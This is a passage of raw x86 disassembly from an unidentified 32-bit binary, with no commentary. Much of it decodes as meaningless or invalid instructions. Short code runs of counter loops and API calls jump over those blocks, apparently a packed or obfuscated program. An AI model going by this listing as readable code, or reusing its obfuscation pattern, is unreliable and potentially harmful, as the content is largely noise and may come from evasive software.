  403bd8:	xor    DWORD PTR [edx],ebx
  403bda:	ja     0x403c1a
  403bdc:	dec    esi
  403bdd:	int3   
  403bde:	xor    BYTE PTR [edi+eax*2],dh
  403be1:	xchg   esi,eax
  403be2:	push   esi
  403be3:	push   edx
  403be4:	dec    edx
  403be5:	in     eax,0xff
  403be7:	pop    edx
  403be8:	popf   
  403be9:	inc    edi
  403bea:	inc    ebp
  403beb:	dec    edi
  403bec:	push   edx
  403bed:	sbb    dl,0x2
  403bf0:	lods   eax,DWORD PTR ds:[esi]
  403bf1:	inc    esp
  403bf2:	xchg   esp,eax
  403bf3:	shr    DWORD PTR [ebx+0x93ffdb2],1
  403bf9:	gs (bad) 
  403bfb:	lahf   
  403bfc:	dec    ebp
  403bfd:	(bad)  
  403bfe:	fcmovb st,st(6)
  403c00:	imul   esp,DWORD PTR [esi+0x659f6d88],0x28
  403c07:	jne    0x403bb1
  403c09:	push   ebx
  403c0a:	jno    0x403b8f
  403c0c:	sbb    BYTE PTR [ecx],bh
  403c0e:	out    dx,eax
  403c0f:	dec    esp
  403c10:	dec    esi
  403c11:	adc    edx,ebp
  403c13:	fadd   QWORD PTR [edx+0x16e7ca2f]
  403c19:	or     BYTE PTR ds:0x3c3bf3c2,bh
  403c1f:	jbe    0x403c1a
  403c21:	cmp    BYTE PTR [ebx+0x4e],0x7
  403c25:	jmp    0x86a7:0xee84c1d2
  403c2c:	push   ecx
  403c2d:	outs   dx,BYTE PTR ds:[esi]
  403c2e:	add    ch,dl
  403c30:	mov    cl,0xda
  403c32:	cmp    eax,0x7e8c42c3
  403c37:	ins    BYTE PTR es:[edi],dx
  403c38:	(bad)  
  403c3a:	adc    eax,0x795c619d
  403c3f:	sbb    bh,0x7d
  403c42:	arpl   WORD PTR ds:0xfc12e776,cx
  403c48:	addr16 push esi
  403c4a:	jecxz  0x403c34
  403c4c:	dec    edx
  403c4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c4e:	jne    0x403c17
  403c50:	push   esi
  403c51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c52:	sbb    ebx,DWORD PTR [edi-0x7a]
  403c55:	inc    ecx
  403c56:	sti    
  403c57:	sbb    ecx,edi
  403c59:	pop    esp
  403c5a:	call   0x6bfe85b7
  403c5f:	push   ds
  403c60:	adc    DWORD PTR [ecx+0x12],edx
  403c63:	or     BYTE PTR [ecx],al
  403c65:	dec    eax
  403c66:	jb     0x403bff
  403c68:	(bad)  
  403c69:	xor    eax,0x1f2d0194
  403c6e:	sub    BYTE PTR [esi+ebx*8+0x12267ed1],ch
  403c75:	dec    ecx
  403c76:	pop    esp
  403c77:	or     al,0x46
  403c79:	add    al,0x5
  403c7b:	and    al,0x76
  403c7d:	push   esi
  403c7e:	mov    edx,0x74525466
  403c83:	mov    cl,0x8f
  403c85:	(bad)  
  403c86:	pop    ecx
  403c87:	std    
  403c88:	add    DWORD PTR [esi-0x5a],esp
  403c8b:	inc    ebp
  403c8c:	push   0x15cc4f25
  403c91:	repz xchg edi,eax
  403c93:	and    eax,ecx
  403c95:	popa   
  403c96:	lods   al,BYTE PTR ds:[esi]
  403c97:	imul   edi,edi,0x476e20f7
  403c9d:	sbb    DWORD PTR [edi-0x1314c10f],eax
  403ca3:	push   edi
  403ca4:	cmp    edx,DWORD PTR [ebx]
  403ca6:	sub    BYTE PTR [ebp-0x4c],bh
  403ca9:	jecxz  0x403c60
  403cab:	sub    al,0x4a
  403cad:	jns    0x403d06
  403caf:	jg     0x403cf6
  403cb1:	cld    
  403cb2:	adc    DWORD PTR [edi+0x2d],edi
  403cb5:	mov    db5,ebx
  403cb8:	rol    BYTE PTR [edi],1
  403cba:	in     eax,dx
  403cbb:	sub    DWORD PTR [ebx+0x70],0xffffffd7
  403cbf:	out    dx,al
  403cc0:	fbstp  TBYTE PTR [eax]
  403cc2:	cmp    esi,DWORD PTR [esi]
  403cc4:	mov    ch,0xca
  403cc6:	xchg   esp,eax
  403cc7:	inc    edi
  403cc8:	dec    ecx
  403cc9:	and    eax,0x51b8675d
  403cce:	out    0x24,al
  403cd0:	jnp    0x403cc8
  403cd2:	inc    ebp
  403cd3:	(bad)  
  403cd4:	iret   
  403cd5:	das    
  403cd6:	cmp    edi,eax
  403cd8:	pop    edx
  403cd9:	xchg   esi,eax
  403cda:	adc    al,0xc5
  403cdc:	call   0x59c69d9f
  403ce1:	cmp    al,0xe0
  403ce3:	pop    esp
  403ce4:	fnstsw WORD PTR [esi-0x32]
  403ce7:	or     esp,DWORD PTR [edi+0x1baad668]
  403ced:	push   ebx
  403cee:	inc    esp
  403cef:	inc    eax
  403cf0:	jne    0x403cd9
  403cf2:	(bad)  [ecx+0x24cf139c]
  403cf8:	stc    
  403cf9:	or     BYTE PTR [ebx+0x5279f40f],dh
  403cff:	and    BYTE PTR [edi],dl
  403d01:	in     eax,dx
  403d02:	sar    DWORD PTR [ebx],0x69
  403d05:	arpl   cx,bp
  403d07:	push   esi
  403d08:	pop    ebp
  403d09:	inc    esi
  403d0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d0b:	cli    
  403d0c:	ret    0x3c60
  403d0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d10:	es push edx
  403d12:	add    edx,ecx
  403d14:	and    DWORD PTR ds:0x424848,0x0
  403d1e:	mov    ebx,DWORD PTR ds:0x424848
  403d24:	inc    ebx
  403d25:	mov    DWORD PTR ds:0x424848,ebx
  403d2b:	cmp    DWORD PTR ds:0x424848,0x1a
  403d32:	jne    0x403d41
  403d38:	push   DWORD PTR [ebp-0xc]
  403d3b:	call   DWORD PTR ds:0x44300c
  403d41:	cmp    DWORD PTR ds:0x424848,0x12
  403d48:	jb     0x403d1e
  403d4e:	add    ebx,DWORD PTR ds:0x44898c
  403d54:	imul   edx,edi
  403d57:	mov    edi,DWORD PTR [ebp-0x8]
  403d5a:	mov    ebx,DWORD PTR [ebp-0x10]
  403d5d:	sbb    DWORD PTR ds:0x44b6e0,0x3f1a
  403d67:	sub    ebx,edi
  403d69:	cmp    ebx,edx
  403d6b:	ja     0x403d93
  403d71:	add    edx,DWORD PTR ds:0x41074b
  403d77:	mov    edx,DWORD PTR [ebp-0x4]
  403d7a:	xor    edx,eax
  403d7c:	not    DWORD PTR ds:0x44e40c
  403d82:	add    edx,ecx
  403d84:	mov    DWORD PTR ds:0x44e418,0x3a6f
  403d8e:	jmp    0x4047a2
  403d93:	movzx  ebx,WORD PTR ds:0x44b6d4
  403d9a:	or     DWORD PTR ds:0x448990,ebx
  403da0:	mov    edx,DWORD PTR [ebp-0x2c]
  403da3:	mov    DWORD PTR ds:0x448994,0x16
  403dad:	cmp    DWORD PTR ds:0x448994,0x0
  403db4:	je     0x403e6e
  403dba:	cmp    DWORD PTR ds:0x448994,0x20
  403dc1:	jne    0x403dd5
  403dc7:	push   DWORD PTR [ebp-0x18]
  403dca:	push   0x4107a9
  403dcf:	call   DWORD PTR ds:0x44335c
  403dd5:	mov    ebx,DWORD PTR ds:0x448994
  403ddb:	dec    ebx
  403ddc:	mov    DWORD PTR ds:0x448994,ebx
  403de2:	jmp    0x403dad
  403de7:	and    DWORD PTR ds:0x424844,0x0
  403df1:	jmp    0x403e03
  403df6:	mov    ebx,DWORD PTR ds:0x424844
  403dfc:	inc    ebx
  403dfd:	mov    DWORD PTR ds:0x424844,ebx
  403e03:	cmp    DWORD PTR ds:0x424844,0x1c
  403e0a:	jae    0x403e6e
  403e10:	cmp    DWORD PTR ds:0x424844,0xc
  403e17:	jne    0x403e4f
  403e1d:	push   DWORD PTR [ebp-0x10]
  403e20:	push   0x1816
  403e25:	push   DWORD PTR [ebp-0x28]
  403e28:	push   0x7e95
  403e2d:	push   0x4109
  403e32:	push   0x336d
  403e37:	push   0x1411
  403e3c:	push   DWORD PTR [ebp-0x20]
  403e3f:	push   0x7b8b
  403e44:	push   0x3268
  403e49:	call   DWORD PTR ds:0x4430d8
  403e4f:	cmp    DWORD PTR ds:0x424844,0xb
  403e56:	jne    0x403e69
  403e5c:	mov    ebx,DWORD PTR ds:0x424844
  403e62:	inc    ebx
  403e63:	mov    DWORD PTR ds:0x424844,ebx
  403e69:	jmp    0x403df6
  403e6e:	mov    edi,DWORD PTR [ebp-0x4]
  403e71:	xor    edx,eax
  403e73:	xor    edi,eax
  403e75:	add    edi,ecx
  403e77:	add    edx,ecx
  403e79:	imul   edx,edi
  403e7c:	mov    edi,DWORD PTR [ebp-0x8]
  403e7f:	mov    ebx,DWORD PTR [ebp-0x10]
  403e82:	sub    ebx,edi
  403e84:	cmp    ebx,edx
  403e86:	ja     0x403e94
  403e8c:	mov    edx,DWORD PTR [ebp-0x28]
  403e8f:	jmp    0x40462f
  403e94:	mov    edx,DWORD PTR [ebp-0x30]
  403e97:	mov    edi,DWORD PTR [ebp-0x4]
  403e9a:	jmp    0x403fff
  403e9f:	dec    ebp
  403ea0:	xchg   esp,eax
  403ea1:	(bad)  
  403ea2:	call   0xa99e390c
  403ea7:	sub    ah,ah
  403ea9:	adc    al,0xc3
  403eab:	das    
  403eac:	xor    DWORD PTR [esi+0x7c195eb6],esi
  403eb2:	jl     0x403ee8
  403eb4:	jg     0x403f32
  403eb6:	jl     0x403e97
  403eb8:	scas   al,BYTE PTR es:[edi]
  403eb9:	fbstp  TBYTE PTR [ecx-0x32662e80]
  403ebf:	out    dx,al
  403ec0:	neg    BYTE PTR [ecx+0x45]
  403ec3:	lds    edi,FWORD PTR [edi+0x54]
  403ec6:	jl     0x403f3f
  403ec8:	je     0x403e59
  403eca:	sub    DWORD PTR [ebp+eiz*1+0x2f],0x9d7ba917
  403ed2:	add    ebp,edi
  403ed4:	(bad)  
  403ed5:	xlat   BYTE PTR ds:[ebx]
  403ed6:	les    ebp,FWORD PTR [edi+ebp*8+0x3f23fac4]
  403edd:	sub    ch,0xec
  403ee0:	mov    dh,0xa5
  403ee2:	cmp    DWORD PTR [edx+0x1734a727],ecx
  403ee8:	and    eax,0x70ae5dd2
  403eed:	bt     DWORD PTR [edi],ebp
  403ef0:	push   edi
  403ef1:	xchg   DWORD PTR [ecx-0x4288c0e5],ebp
  403ef7:	jae    0x403f54
  403ef9:	cld    
  403efa:	cmp    eax,0x6f9e4c65
  403eff:	push   esi
  403f00:	jb     0x403ee3
  403f02:	dec    ebx
  403f03:	test   DWORD PTR [edx],esp
  403f05:	(bad)  
  403f06:	jnp    0x403e95
  403f08:	and    BYTE PTR [ecx],dh
  403f0a:	test   BYTE PTR [esp+esi*8],cl
  403f0d:	mov    BYTE PTR ds:[esi-0x31],al
  403f11:	inc    edi
  403f12:	adc    DWORD PTR [esi+0x39],ebp
  403f15:	xor    dh,BYTE PTR [edx]
  403f17:	int    0x22
  403f19:	xor    esi,0xffffffb3
  403f1c:	push   es
  403f1d:	jne    0x403f55
  403f1f:	ins    DWORD PTR es:[edi],dx
  403f20:	push   esi
  403f21:	jmp    0x2d2f:0x8708bc7c
  403f28:	rcl    DWORD PTR [edx],1
  403f2a:	cld    
  403f2b:	ficomp WORD PTR [ebx-0x23cbb4d4]
  403f31:	adc    DWORD PTR [eax-0x58],ebp
  403f34:	push   ecx
  403f35:	add    al,0xa6
  403f37:	adc    BYTE PTR [ebx],0x7e
  403f3a:	sti    
  403f3b:	je     0x403ebd
  403f3d:	sahf   
  403f3e:	xchg   ecx,eax
  403f3f:	enter  0x63cf,0x52
  403f43:	dec    ebx
  403f44:	pop    ebx
  403f45:	(bad)  [esi+0x4e]
  403f48:	jl     0x403ee2
  403f4a:	rol    DWORD PTR [ebp-0x5c],1
  403f4d:	inc    esi
  403f4e:	fisub  DWORD PTR [edi+0x3c19b4ce]
  403f54:	push   edx
  403f55:	sbb    al,0xad
  403f57:	(bad)  
  403f58:	and    dh,BYTE PTR [ecx]
  403f5a:	test   BYTE PTR [edi-0x4c],bl
  403f5d:	cmp    BYTE PTR [esi+0x37791b9d],0x85
  403f64:	in     eax,dx
  403f65:	popa   
  403f66:	mov    ebx,0x6fe605c
  403f6b:	adc    eax,0xd795d348
  403f70:	aas    
  403f71:	lea    esp,[ebx+edx*4+0xad0a760]
  403f78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f79:	sbb    al,0xa0
  403f7b:	leave  
  403f7c:	(bad)  
  403f7d:	xchg   esp,eax
  403f7e:	fstp   QWORD PTR ds:0x9f4d5dcb
  403f84:	dec    ecx
  403f85:	push   cs
  403f86:	adc    eax,0xc3a6c04c
  403f8b:	lods   eax,DWORD PTR ds:[si]
  403f8d:	rcr    DWORD PTR [eax],1
  403f8f:	in     eax,dx
  403f90:	cdq    
  403f91:	push   0x973623ef
  403f96:	adc    cl,cl
  403f98:	gs push ecx
  403f9a:	sahf   
  403f9b:	scas   eax,DWORD PTR es:[edi]
  403f9c:	into   
  403f9d:	fldcw  WORD PTR [esi]
  403f9f:	xchg   edx,eax
  403fa0:	sbb    bl,BYTE PTR [edi-0x55369c79]
  403fa6:	jno    0x403f54
  403fa8:	leave  
  403fa9:	sub    al,0x6f
  403fab:	popf   
  403fac:	aaa    
  403fad:	test   eax,0x2c6e37e6
  403fb2:	adc    al,0x43
  403fb4:	scas   al,BYTE PTR es:[edi]
  403fb5:	pop    ecx
  403fb6:	xor    BYTE PTR [edi+0x7aa5c21e],bh
  403fbc:	mov    ecx,0x1a19ffb2
  403fc1:	jo     0x403f60
  403fc3:	inc    ebp
  403fc4:	lock lahf 
  403fc6:	jmp    0x4dbaef5d
  403fcb:	xchg   esi,eax
  403fcc:	cdq    
  403fcd:	loopne 0x403fe4
  403fcf:	mov    ch,0x8d
  403fd1:	pop    es
  403fd2:	stos   DWORD PTR es:[edi],eax
  403fd3:	add    DWORD PTR [ebp-0x51],0xe5263b0a
  403fda:	inc    esi
  403fdb:	das    
  403fdc:	lods   al,BYTE PTR ds:[esi]
  403fdd:	out    dx,al
  403fde:	scas   al,BYTE PTR es:[edi]
  403fdf:	lods   al,BYTE PTR ds:[esi]
  403fe0:	xchg   edi,eax
  403fe1:	mov    ebx,0xe72a6ede
  403fe6:	outs   dx,BYTE PTR ds:[esi]
  403fe7:	ins    DWORD PTR es:[edi],dx
  403fe8:	jecxz  0x403f73
  403fea:	jbe    0x40400e
  403fec:	das    
  403fed:	ins    BYTE PTR es:[edi],dx
  403fee:	pop    esp
  403fef:	mov    eax,0xc12a391b
  403ff4:	scas   eax,DWORD PTR es:[edi]
  403ff5:	(bad)  
  403ff6:	js     0x40402a
  403ff8:	dec    eax
  403ff9:	inc    ebp
  403ffa:	pop    ebx
  403ffb:	fsubr  DWORD PTR [ebp+0x48]
  403ffe:	je     0x404033
  404000:	shl    BYTE PTR [ebx],1
  404002:	clc    
  404003:	add    edi,ecx
  404005:	add    edx,ecx
  404007:	imul   edx,edi
  40400a:	mov    edi,DWORD PTR [ebp-0x8]
  40400d:	mov    ebx,DWORD PTR [ebp-0x10]
  404010:	sub    ebx,edi
  404012:	cmp    ebx,edx
  404014:	ja     0x404022
  40401a:	mov    edx,DWORD PTR [ebp-0x2c]
  40401d:	jmp    0x40462f
  404022:	mov    edx,DWORD PTR [ebp-0x34]
  404025:	mov    edi,DWORD PTR [ebp-0x4]
  404028:	xor    edx,eax
  40402a:	xor    edi,eax
  40402c:	add    edi,ecx
  40402e:	add    edx,ecx
  404030:	imul   edx,edi
  404033:	mov    edi,DWORD PTR [ebp-0x8]
  404036:	mov    ebx,DWORD PTR [ebp-0x10]
  404039:	sub    ebx,edi
  40403b:	cmp    ebx,edx
  40403d:	jmp    0x4041a2
  404042:	sbb    DWORD PTR [edx+ecx*2],esi
  404045:	cs pop ebp
  404047:	mov    ds:0xe1ed77d,al
  40404c:	cmovae ecx,DWORD PTR [esi+ebx*2+0x1b164d6a]
  404054:	jl     0x4040d2
  404056:	xor    al,0x7f
  404058:	jl     0x4040d6
  40405a:	hlt    
  40405b:	aad    0xc5
  40405d:	sbb    al,0xb5
  40405f:	pop    ss
  404060:	jp     0x40408b
  404062:	push   es
  404063:	push   ss
  404064:	xor    ah,ch
  404066:	add    esp,DWORD PTR [ecx-0x7c12c391]
  40406c:	sahf   
  40406d:	ret    
  40406e:	xchg   esp,eax
  40406f:	adc    eax,0x760a8dde
  404074:	imul   ebp,edx,0xffffffff
  404077:	xor    ecx,edx
  404079:	mov    dh,0x97
  40407b:	adc    dl,BYTE PTR [edx+edi*1]
  40407e:	shl    BYTE PTR [edx+0x565f34bf],cl
  404084:	loope  0x40405a
  404086:	inc    esp
  404087:	mov    ah,0x54
  404089:	retf   0x30f8
  40408c:	in     eax,0x8e
  40408e:	test   al,0x74
  404090:	inc    ebp
  404091:	pop    ebx
  404092:	sbb    al,0x77
  404094:	ret    0xe19b
  404097:	sub    BYTE PTR [ebx+0x77],dl
  40409a:	call   0x434323a7
  40409f:	aam    0xaa
  4040a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040a2:	test   DWORD PTR [esi],0xc754bfb
  4040a8:	mov    ds:0x137245f1,eax
  4040ad:	ds dec esi
  4040af:	in     al,0xe
  4040b1:	out    0xe9,al
  4040b3:	pop    es
  4040b4:	jmp    0x5102:0xc4c1574b
  4040bb:	push   es
  4040bc:	pop    ebp
  4040bd:	inc    edi
  4040be:	popf   
  4040bf:	cmp    BYTE PTR [eax-0x27],0x62
  4040c3:	mov    edi,0x3129ceb6
  4040c8:	mov    ah,0x1e
  4040ca:	and    ebx,DWORD PTR [ebx]
  4040cc:	mov    eax,ds:0xfea2bf70
  4040d1:	mov    bh,0xbf
  4040d3:	fld    DWORD PTR [edi-0x127f88ea]
  4040d9:	xor    eax,0xed54a694
  4040de:	sahf   
  4040df:	adc    bh,BYTE PTR [edx-0x37]
  4040e2:	mov    ah,0x4f
  4040e4:	push   ebx
  4040e5:	xor    eax,0xe82f623c
  4040ea:	call   0xfc61:0xca11d60
  4040f1:	mov    cl,0xf5
  4040f3:	ins    DWORD PTR es:[edi],dx
  4040f4:	int3   
  4040f5:	dec    edx
  4040f6:	iret   
  4040f7:	sbb    BYTE PTR [eax-0x548d0473],ch
  4040fd:	sub    DWORD PTR [edx],edi
  4040ff:	xor    BYTE PTR [ecx-0x7dd02912],ah
  404105:	push   cs
  404106:	jmp    0x403:0x541a1666
  40410d:	enter  0xf343,0xb4
  404111:	(bad)  
  404112:	jnp    0x40414c
  404114:	jno    0x40416b
  404116:	mov    eax,0xa973ad98
  40411b:	mov    ebx,0xdebfbd8c
  404120:	mov    eax,0x35916c5a
  404125:	test   eax,0x51c97c0f
  40412a:	addr16 retf 0x39d1
  40412e:	popa   
  40412f:	and    al,0xe6
  404131:	jns    0x4040e1
  404133:	dec    esi
  404134:	in     al,dx
  404135:	add    al,0x90
  404137:	jecxz  0x4040e9
  404139:	mov    al,ds:0x868b9c19
  40413e:	stos   DWORD PTR es:[edi],eax
  40413f:	test   DWORD PTR [ebx+0x18],ecx
  404142:	lock sub eax,0x31b3f393
  404148:	into   
  404149:	cmp    esi,DWORD PTR [edx-0xbc28331]
  40414f:	fcomp  QWORD PTR [ebx+0x15]
  404152:	mov    al,ds:0xbef50e0f
  404157:	cmp    dl,BYTE PTR [ebp+ecx*8-0x41]
  40415b:	jae    0x40412d
  40415d:	push   ecx
  40415e:	jno    0x4041a1
  404160:	ret    0x8d8c
  404163:	adc    BYTE PTR fs:[eax+0x5efe3101],al
  40416a:	fimul  DWORD PTR [ecx-0x5137edb5]
  404170:	test   al,0xb1
  404172:	(bad)  
  404173:	fcomp  st(0)
  404175:	lock and cl,BYTE PTR [edx+0x11f0521b]
  40417c:	enter  0x1d60,0x16
  404180:	lods   eax,DWORD PTR ds:[esi]
  404181:	pop    edx
  404182:	mov    eax,es:0xc73664b7
  404188:	jne    0x404116
  40418a:	adc    bl,al
  40418c:	(bad)  
  40418d:	sbb    al,0xb1
  40418f:	xchg   DWORD PTR [ebx-0x9caddb2],ebx
  404195:	sti    
  404196:	(bad)  
  404197:	sbb    dh,BYTE PTR [ebx]
  404199:	pop    ebp
  40419a:	test   DWORD PTR [edi],0x9eb1c86d
  4041a0:	push   esi
  4041a1:	js     0x4041b2
  4041a3:	xchg   DWORD PTR [eax],ecx
  4041a5:	add    BYTE PTR [eax],al
  4041a7:	add    BYTE PTR [ebx+0x7fe9d055],cl
  4041ad:	add    al,0x0
  4041af:	add    BYTE PTR [ebx+0x7d8bc855],cl
  4041b5:	cld    
  4041b6:	xor    edx,eax
  4041b8:	xor    edi,eax
  4041ba:	jmp    0x40431f
  4041bf:	dec    ecx
  4041c0:	inc    ebx
  4041c1:	fdivr  st,st(0)
  4041c3:	fidivr DWORD PTR [ebx+0x69]
  4041c6:	gs jge 0x40418a
  4041c9:	shr    ebx,cl
  4041cb:	test   al,0x75
  4041cd:	(bad)  
  4041ce:	js     0x4041be
  4041d0:	sbb    bh,BYTE PTR [esp+edi*2+0x34]
  4041d4:	jg     0x404252
  4041d6:	jl     0x40418c
  4041d8:	pop    esi
  4041d9:	adc    BYTE PTR [edx+0x23],ah
  4041dc:	pop    eax
  4041dd:	loope  0x4041e3
  4041df:	inc    edi
  4041e0:	cdq    
  4041e1:	shl    BYTE PTR [edx+ebx*4-0x7d],1
  4041e5:	rol    DWORD PTR [eax],0x98
  4041e8:	not    DWORD PTR [esi-0x4d]
  4041eb:	sbb    eax,0x46bcc9a4
  4041f0:	test   BYTE PTR [ebx],dl
  4041f2:	sbb    al,0x96
  4041f4:	mov    esi,0xce8257df
  4041f9:	or     eax,0x1b89eb22
  4041fe:	(bad)  
  4041ff:	fimul  DWORD PTR [edi-0x25553cc5]
  404205:	bound  edi,QWORD PTR [eax+0x18]
  404208:	clc    
  404209:	adc    ch,ch
  40420b:	inc    ebp
  40420c:	xchg   BYTE PTR [esi+ebp*1-0x2],ah
  404210:	aas    
  404211:	dec    edi
  404212:	pop    edi
  404213:	call   0x9f15:0xc37c841f
  40421a:	jmp    FWORD PTR [ebx+0x62a6ec2c]
  404220:	inc    ebx
  404221:	mov    al,0xe7
  404223:	xchg   ecx,eax
  404224:	test   eax,0x9137e15f
  404229:	sub    BYTE PTR [esi],bl
  40422b:	push   ebx
  40422c:	std    
  40422d:	push   es
  40422e:	dec    ebp
  40422f:	push   0xecac6a84
  404234:	or     al,al
  404236:	das    
  404237:	fs js  0x4041e7
  40423a:	xchg   ebx,eax
  40423b:	rcl    DWORD PTR [edi+0x58],0x4e
  40423f:	add    esi,DWORD PTR [ecx]
  404241:	and    edi,DWORD PTR [ecx+0x5dc7395a]
  404247:	mov    ah,0x1
  404249:	jg     0x40426b
  40424b:	inc    ecx
  40424c:	arpl   cx,bp
  40424e:	jle    0x40425f
  404250:	jl     0x4041d3
  404252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404253:	mov    edx,0xf5265888
  404258:	int    0xbd
  40425a:	xchg   ch,dh
  40425c:	pop    ebx
  40425d:	sbb    eax,0xfd584016
  404262:	adc    al,0xdb
  404264:	pop    esp
  404265:	cmc    
  404266:	and    BYTE PTR [edx+0x1093d2],bh
  40426c:	nop
  40426d:	ja     0x40423d
  40426f:	retf   0xbc59
  404272:	out    0x67,al
  404274:	pop    eax
  404275:	jle    0x404255
  404277:	sbb    DWORD PTR [ebp+0x515e44ab],ecx
  40427d:	sub    edi,esp
  40427f:	push   0x451e124e
  404284:	add    eax,0xc0064423
  404289:	jge    0x404245
  40428b:	pop    ecx
  40428c:	lock push 0xffffffe1
  40428f:	pop    es
  404290:	inc    eax
  404291:	int3   
  404292:	adc    DWORD PTR [eax-0x7b6698f0],esp
  404298:	out    dx,eax
  404299:	cmovo  esi,ecx
  40429c:	jnp    0x40423a
  40429e:	mov    esp,0x40d9ddf1
  4042a3:	shl    DWORD PTR [eax+edx*4],0x1
  4042a7:	dec    esp
  4042a8:	mov    eax,ds:0x84fddcd9
  4042ad:	into   
  4042ae:	nop
  4042af:	and    edx,DWORD PTR [edx-0x29618ad]
  4042b5:	mov    esi,0xebe89255
  4042ba:	call   0x148c6d5a
  4042bf:	adc    ch,BYTE PTR [eax+edi*2-0x2e2d30db]
  4042c6:	pushf  
  4042c7:	rcl    DWORD PTR [edi+eax*4+0x5c],cl
  4042cb:	les    eax,FWORD PTR [edi+0x54c1f507]
  4042d1:	les    eax,FWORD PTR [eax]
  4042d3:	icebp  
  4042d4:	bound  edi,QWORD PTR [eax+0x4b]
  4042d7:	inc    esp
  4042d8:	push   ebx
  4042d9:	jno    0x4042bf
  4042db:	pop    edx
  4042dc:	mov    cl,0xf2
  4042de:	mov    ebp,0x6a908db6
  4042e3:	jge    0x40434d
  4042e5:	dec    ebx
  4042e6:	les    ebp,FWORD PTR [ebx-0x557fbec]
  4042ec:	jp     0x404310
  4042ee:	push   0xffb2fa14
  4042f3:	mov    edx,0xe4a231b7
  4042f8:	bnd jp 0x404364
  4042fb:	je     0x4042ce
  4042fd:	inc    edi
  4042fe:	xchg   ecx,eax
  4042ff:	or     DWORD PTR [ebx],ecx
  404301:	mov    esp,esp
  404303:	ins    DWORD PTR es:[edi],dx
  404304:	mov    ecx,0xec5f126d
  404309:	add    DWORD PTR ds:0x47d31f83,edx
  40430f:	push   es
  404310:	pop    esp
  404311:	lds    edi,FWORD PTR [eax+0x79c35f7d]
  404317:	xor    cl,cl
  404319:	xor    al,0x3c
  40431b:	jp     0x404326
  40431d:	stc    
  40431e:	jno    0x404323
  404320:	stc    
  404321:	add    edx,ecx
  404323:	imul   edx,edi
  404326:	mov    edi,DWORD PTR [ebp-0x8]
  404329:	jmp    0x40448e
  40432e:	fwait
  40432f:	bound  esp,QWORD PTR [edi]
  404331:	pushf  
  404332:	stc    
  404333:	ins    DWORD PTR es:[edi],dx
  404334:	fwait
  404335:	jge    0x4042bf
  404337:	les    ecx,FWORD PTR [ebp+0x29]
  40433a:	out    0x6c,al
  40433c:	js     0x404315
  40433e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40433f:	sbb    eax,0x7f347c7c
  404344:	jl     0x4043c2
  404346:	(bad)  
  404347:	jae    0x404333
  404349:	gs dec esp
  40434b:	jge    0x404344
  40434d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40434e:	ja     0x404381
  404350:	cmp    al,0x79
  404352:	dec    edx
  404353:	push   cs
  404354:	push   edi
  404355:	mov    bl,0x5f
  404357:	inc    eax
  404358:	cld    
  404359:	stc    
  40435a:	sbb    DWORD PTR [ebp+0x14e9fe18],ebp
  404360:	cdq    
  404361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404362:	pop    ecx
  404363:	test   eax,0x30e634b0
  404368:	inc    edx
  404369:	in     eax,dx
  40436a:	data16 jae 0x40434a
  40436d:	pop    esi
  40436e:	or     al,0xb9
  404370:	push   esi
  404371:	aas    
  404372:	nop
  404373:	dec    esi
  404374:	repz scas eax,DWORD PTR es:[edi]
  404376:	popa   
  404377:	jl     0x4042fb
  404379:	add    al,0xd1
  40437b:	push   edi
  40437c:	or     al,0xcf
  40437e:	ins    DWORD PTR es:[edi],dx
  40437f:	push   esp
  404380:	and    al,0x72
  404382:	call   DWORD PTR [edi+0x46686049]
  404388:	mov    dl,0xb4
  40438a:	repz push ds
  40438c:	adc    DWORD PTR [esi],ecx
  40438e:	(bad)  
  404390:	in     eax,0x83
  404392:	or     DWORD PTR [eax+edi*4+0x7f],ecx
  404396:	lock dec esi
  404398:	sub    eax,0x804d0408
  40439d:	mov    eax,0x1866ff2d
  4043a2:	ins    DWORD PTR es:[edi],dx
  4043a3:	jl     0x40437c
  4043a5:	stc    
  4043a6:	xor    eax,0xa89c60fa
  4043ab:	ds jo  0x4043ec
  4043ae:	popw   ss
  4043b0:	imul   eax,DWORD PTR [eax-0xca11f2b],0x1f4d3d61
  4043ba:	(bad)  
  4043bb:	mov    dh,0x4
  4043bd:	das    
  4043be:	cmp    al,0x55
  4043c0:	mov    dl,0x25
  4043c2:	fmul   st(7),st
  4043c4:	mov    al,0x9a
  4043c6:	dec    ebp
  4043c7:	mov    eax,ds:0x2d5820c2
  4043cc:	xchg   DWORD PTR [esi],ecx
  4043ce:	arpl   WORD PTR [edx],bx
  4043d0:	imul   DWORD PTR [edi+0x13]
  4043d3:	or     dh,al
  4043d5:	rcr    BYTE PTR [ecx-0x77],cl
  4043d8:	or     BYTE PTR [esi+0x77],dl
  4043db:	cs leave 
  4043dd:	mov    dl,0xaf
  4043df:	int    0xb5
  4043e1:	bound  ebp,QWORD PTR [eax]
  4043e3:	mov    dl,0xee
  4043e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043e6:	cmp    edx,ebx
  4043e8:	das    
  4043e9:	pop    ecx
  4043ea:	mov    edx,0x97c1fe49
  4043ef:	loop   0x404383
  4043f1:	dec    ebp
  4043f2:	jecxz  0x404445
  4043f4:	sbb    al,0x53
  4043f6:	ret    0x8eda
  4043f9:	in     al,0xd5
  4043fb:	js     0x4043ad
  4043fd:	js     0x4043ed
  4043ff:	ds or  al,0x54
  404402:	dec    edi
  404403:	mov    eax,ds:0x524f99e9
  404408:	out    0x93,eax
  40440a:	out    dx,al
  40440b:	add    dh,ch
  40440d:	dec    edx
  40440e:	cs mov ecx,0xde9be81b
  404414:	out    dx,al
  404415:	ret    
  404416:	dec    edx
  404417:	add    DWORD PTR [ebx-0x7cceb9fa],0xee0dcdf9
  404421:	cmp    BYTE PTR [edi+0x2d],0x47
  404425:	ds push cs
  404427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404428:	mov    ds:0x516fb000,eax
  40442d:	jp     0x4043ce
  40442f:	sti    
  404430:	xlat   BYTE PTR ds:[ebx]
  404431:	repz and al,BYTE PTR [esi+0xe]
  404435:	sti    
